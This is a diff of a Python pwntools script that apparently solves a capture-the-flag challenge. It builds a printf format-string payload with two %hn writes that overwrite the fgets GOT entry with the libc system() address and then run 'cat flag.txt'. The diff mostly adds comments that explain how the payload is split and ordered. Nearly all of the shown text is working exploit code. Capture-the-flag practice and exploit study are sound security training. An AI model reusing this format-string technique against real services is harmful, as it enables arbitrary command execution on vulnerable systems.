@@ -34,32 +34,36 @@ print(f"system address: {hex(system_libc_address)}")
 
 # Setup the payload used to write in the GOT entry
 new_address = str(hex(system_libc_address))
-char_to_print_ls = int(new_address[-4:], 16)
-char_to_print_ms = int(new_address[-8:-4], 16)
+char_to_print_ls = int(new_address[-4:], 16)            # Least significant part of the address
+char_to_print_ms = int(new_address[-8:-4], 16)          # Most significant part of the address
 print(f"What we will print: {hex(char_to_print_ms)} - {hex(char_to_print_ls)}")
 
 payload = b"cat flag.txt    "
 
+# Since we need to change the whole address in one go, we have to write 4 bytes, using two %hn
+# %n will count the characters printed in the printf call, so we first have to write the 
+# smaller half (in number of char) and then the bigger one. For the latter, we will print only an amount
+# of char equal to the difference between the twos.
+
 if(char_to_print_ms > char_to_print_ls):        # First we write the ls, then the ms
-    payload += (f"%{(char_to_print_ls - len(payload))}c%12$hn").encode()
+    payload += (f"%{(char_to_print_ls - len(payload))}c%12$hn").encode()        # Remove the char already printed
     payload += (f"%{(char_to_print_ms - char_to_print_ls)}c%13$hn").encode()
-    payload += b" " * (8 - len(payload)%8)
-    payload += p64(got_fgets)
+    payload += b" " * (8 - len(payload)%8)                                      # Makes the payload size multiple of 8
+    payload += p64(got_fgets)                                                   # The two addressess we will print to
     payload += p64(got_fgets + 2)
-else:
+else:                                           # Otherwise, swap the two
     payload += (f"%{(char_to_print_ms - len(payload))}c%12$hn").encode()
     payload += (f"%{(char_to_print_ls - char_to_print_ms)}c%13$hn").encode()
     payload += b" " * (8 - len(payload)%8)
-    payload += p64(got_fgets + 2)
+    payload += p64(got_fgets + 2)                                               # Having swapped the pieces, we also swap the addresses
     payload += p64(got_fgets)
 
 print(payload)
 
-conn.sendlineafter(b'> ', payload)              # Send the payload
+conn.sendlineafter(b'> ', payload)              # Send the payload and receive the flag
 
 conn.recvuntil(b"U")
 flag = (b"U" + conn.recvuntil(b"}")).decode()
 conn.close()
 print(flag)
-#conn.interactive()
 
